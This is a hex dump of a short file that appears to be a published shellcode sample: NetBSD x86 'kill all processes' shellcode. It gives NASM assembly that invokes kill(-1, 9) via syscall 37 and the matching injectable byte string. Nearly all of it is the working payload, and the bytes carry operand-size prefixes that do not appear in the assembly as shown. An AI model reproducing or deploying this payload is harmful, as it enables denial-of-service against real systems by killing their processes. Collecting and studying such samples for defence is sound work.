00000000  2f 2a 0d 0a 6e 65 74 62  73 64 2f 78 38 36 20 6b  |/*..netbsd/x86 k|
00000010  69 6c 6c 20 61 6c 6c 20  70 72 6f 63 65 73 73 65  |ill all processe|
00000020  73 20 73 68 65 6c 6c 63  6f 64 65 0d 0a 61 75 74  |s shellcode..aut|
00000030  68 6f 72 20 41 6e 6f 6e  79 6d 6f 75 73 0d 0a 74  |hor Anonymous..t|
00000040  68 69 73 20 73 68 65 6c  6c 63 6f 64 65 20 69 73  |his shellcode is|
00000050  20 75 73 69 6e 67 20 73  79 73 63 61 6c 6c 20 6e  | using syscall n|
00000060  75 6d 62 65 72 20 33 37  20 6f 72 20 30 78 32 35  |umber 37 or 0x25|
00000070  0d 0a 33 37 20 20 20 20  20 20 53 54 44 20 20 20  |..37      STD   |
00000080  20 20 20 20 20 20 20 20  20 20 7b 20 69 6e 74 20  |          { int |
00000090  73 79 73 5f 6b 69 6c 6c  28 69 6e 74 20 70 69 64  |sys_kill(int pid|
000000a0  2c 20 69 6e 74 20 73 69  67 6e 75 6d 29 3b 20 7d  |, int signum); }|
000000b0  0d 0a 68 65 72 65 20 69  73 20 61 73 73 65 6d 62  |..here is assemb|
000000c0  6c 65 72 20 63 6f 64 65  20 75 73 69 6e 67 20 69  |ler code using i|
000000d0  6e 74 65 6c 20 73 79 6e  74 61 78 65 20 61 6e 64  |ntel syntaxe and|
000000e0  20 4e 41 53 4d 0d 0a 2d  2d 2d 2d 2d 2d 2d 2d 2d  | NASM..---------|
000000f0  2d 2d 2d 2d 2d 62 65 67  69 6e 2d 2d 2d 2d 2d 2d  |-----begin------|
00000100  2d 2d 2d 2d 2d 0d 0a 73  65 63 74 69 6f 6e 20 2e  |-----..section .|
00000110  6e 6f 74 65 2e 6e 65 74  62 73 64 2e 69 64 65 6e  |note.netbsd.iden|
00000120  74 0d 0a 20 20 20 20 64  64 20 20 30 78 30 37 2c  |t..    dd  0x07,|
00000130  30 78 30 34 2c 30 78 30  31 0d 0a 20 20 20 20 64  |0x04,0x01..    d|
00000140  62 20 20 22 4e 65 74 42  53 44 22 2c 30 78 30 30  |b  "NetBSD",0x00|
00000150  2c 30 78 30 30 0d 0a 20  20 20 20 64 64 20 20 32  |,0x00..    dd  2|
00000160  30 30 30 30 30 30 30 30  0d 0a 20 73 65 63 74 69  |00000000.. secti|
00000170  6f 6e 20 2e 64 61 74 61  0d 0a 20 73 65 63 74 69  |on .data.. secti|
00000180  6f 6e 20 2e 74 65 78 74  0d 0a 20 20 20 20 67 6c  |on .text..    gl|
00000190  6f 62 61 6c 20 5f 73 74  61 72 74 0d 0a 20 5f 73  |obal _start.. _s|
000001a0  74 61 72 74 3a 0d 0a 78  6f 72 20 65 61 78 2c 20  |tart:..xor eax, |
000001b0  65 61 78 0d 0a 70 75 73  68 20 30 78 30 39 0d 0a  |eax..push 0x09..|
000001c0  6d 6f 76 20 65 61 78 2c  20 2d 31 0d 0a 70 75 73  |mov eax, -1..pus|
000001d0  68 20 65 61 78 0d 0a 78  6f 72 20 65 61 78 2c 65  |h eax..xor eax,e|
000001e0  61 78 0d 0a 6d 6f 76 20  61 6c 2c 20 33 37 0d 0a  |ax..mov al, 37..|
000001f0  70 75 73 68 20 65 61 78  0d 0a 69 6e 74 20 30 78  |push eax..int 0x|
00000200  38 30 0d 0a 2d 2d 2d 2d  2d 2d 2d 2d 2d 2d 2d 2d  |80..------------|
00000210  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 2d 65 6e 64  |-------------end|
00000220  2d 2d 2d 2d 2d 2d 2d 2d  2d 2d 2d 2d 0d 0a 69 66  |------------..if|
00000230  20 77 65 20 64 69 73 73  61 73 65 6d 62 6c 65 20  | we dissasemble |
00000240  74 68 69 73 20 63 6f 64  65 20 77 69 20 77 69 6c  |this code wi wil|
00000250  6c 20 67 65 74 20 73 68  65 6c 6c 63 6f 64 65 0d  |l get shellcode.|
00000260  0a 22 5c 78 36 36 5c 78  33 31 5c 78 63 30 5c 78  |."\x66\x31\xc0\x|
00000270  36 38 5c 78 30 39 5c 78  30 30 5c 78 36 36 5c 78  |68\x09\x00\x66\x|
00000280  62 38 5c 78 66 66 5c 78  66 66 5c 78 66 66 5c 78  |b8\xff\xff\xff\x|
00000290  66 66 5c 78 36 36 5c 78  35 30 5c 78 36 36 5c 78  |ff\x66\x50\x66\x|
000002a0  33 31 5c 78 63 30 5c 78  62 30 5c 78 32 35 5c 78  |31\xc0\xb0\x25\x|
000002b0  36 36 5c 78 35 30 5c 78  63 64 5c 78 38 30 22 0d  |66\x50\xcd\x80".|
000002c0  0a 2a 2f                                          |.*/|
000002c3
